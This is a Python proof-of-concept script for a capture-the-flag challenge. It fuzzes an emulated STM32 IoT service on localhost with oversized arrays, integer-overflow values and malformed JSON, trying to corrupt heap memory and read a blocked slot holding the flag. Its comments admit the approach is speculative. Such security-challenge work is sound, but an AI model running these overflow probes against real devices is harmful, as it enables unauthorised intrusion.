#!/usr/bin/env python3

import json
import socket
import time

def send_command(host, port, cmd):
    """Send a JSON command to the emulator and get response"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        cmd_str = json.dumps(cmd) + '\n'
        print(f"Sending: {cmd_str.strip()}")
        s.send(cmd_str.encode())
        
        response = s.recv(4096)
        print(f"Response: {response}")
        
        s.close()
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

def test_basic_functionality():
    """Test basic slot access to confirm behavior"""
    print("=== Testing Basic Functionality ===")
    
    # Test normal slots
    for slot in [1, 15]:
        send_command('localhost', 8000, {'slot': slot})
        time.sleep(0.1)
    
    # Test blocked slot
    send_command('localhost', 8000, {'slot': 0})
    time.sleep(0.1)

def test_heap_overflow_patterns():
    """Try various patterns that might trigger heap overflow"""
    print("\n=== Testing Heap Overflow Patterns ===")
    
    # Pattern 1: Large arrays with data parameter
    for size in [100, 500, 1000, 2000]:
        print(f"Testing array size {size}")
        large_array = [0x41] * size  # Fill with 'A'
        result = send_command('localhost', 8000, {'slot': 1, 'data': large_array})
        if not result:
            print("Connection closed - possible crash!")
            return
        time.sleep(0.1)
    
    # Pattern 2: Try to trigger off-by-one in reallocation
    print("Testing reallocation patterns...")
    for i in range(10):
        # Build up buffer size gradually
        array = [i] * (16 + i)  # Start with small sizes
        result = send_command('localhost', 8000, {'slot': 1, 'data': array})
        if not result:
            print("Connection closed - possible crash!")
            return
        time.sleep(0.1)

def test_integer_overflow():
    """Try integer overflow in size calculations"""
    print("\n=== Testing Integer Overflow ===")
    
    # Try very large numbers that might cause integer overflow
    large_numbers = [0xfffffffe, 0xffffffff, 0x80000000]
    
    for num in large_numbers:
        try:
            # Try as slot number (should fail validation but test parsing)
            result = send_command('localhost', 8000, {'slot': num})
            if not result:
                print("Connection closed - possible crash!")
                return
            time.sleep(0.1)
        except:
            continue

def test_malformed_json():
    """Test edge cases in JSON parsing that might trigger vulnerabilities"""
    print("\n=== Testing Malformed JSON Edge Cases ===")
    
    # Test deeply nested structures
    nested_data = {'slot': 1, 'data': [[[[[1]]]]], 'extra': 'test'}
    send_command('localhost', 8000, nested_data)
    time.sleep(0.1)
    
    # Test with very long strings/keys
    long_key = 'x' * 1000
    send_command('localhost', 8000, {'slot': 1, long_key: 'test'})
    time.sleep(0.1)

def attempt_exploit():
    """Main exploit attempt based on analysis"""
    print("\n=== Attempting Exploit ===")
    
    # Based on analysis, try to:
    # 1. Trigger heap overflow through array processing
    # 2. Corrupt memory to bypass slot 0 check
    # 3. Or find a way to directly access slot 0
    
    # Try crafted payload that might overflow and corrupt slot number
    # This is based on the heap allocation pattern in FUN_08008466
    exploit_array = []
    
    # Pattern that might trigger off-by-one in buffer expansion
    # Based on the reallocation logic: iVar6 = uVar10 + 1 where uVar10 = capacity * 2
    for i in range(32):  # Start with pattern that might hit boundary conditions
        exploit_array.append(i % 256)
    
    result = send_command('localhost', 8000, {'slot': 1, 'data': exploit_array})
    
    # Try to trigger the overflow by gradually increasing size
    for multiplier in [2, 4, 8, 16, 32]:
        exploit_array_scaled = exploit_array * multiplier
        print(f"Trying array size: {len(exploit_array_scaled)}")
        result = send_command('localhost', 8000, {'slot': 1, 'data': exploit_array_scaled})
        if not result:
            print("Connection closed!")
            break
        time.sleep(0.1)

def main():
    print("STM32 IoT Challenge Exploit PoC")
    print("Targeting slot 0 to extract the real flag")
    
    test_basic_functionality()
    test_heap_overflow_patterns()
    test_integer_overflow() 
    test_malformed_json()
    attempt_exploit()
    
    # Try to access slot 0 after potential corruption
    print("\n=== Final Test: Accessing Slot 0 ===")
    result = send_command('localhost', 8000, {'slot': 0})
    
    if result and b'TISC{' in result:
        print("SUCCESS! Found flag:", result)
    else:
        print("Exploit unsuccessful. Need to refine approach.")

if __name__ == "__main__":
    main()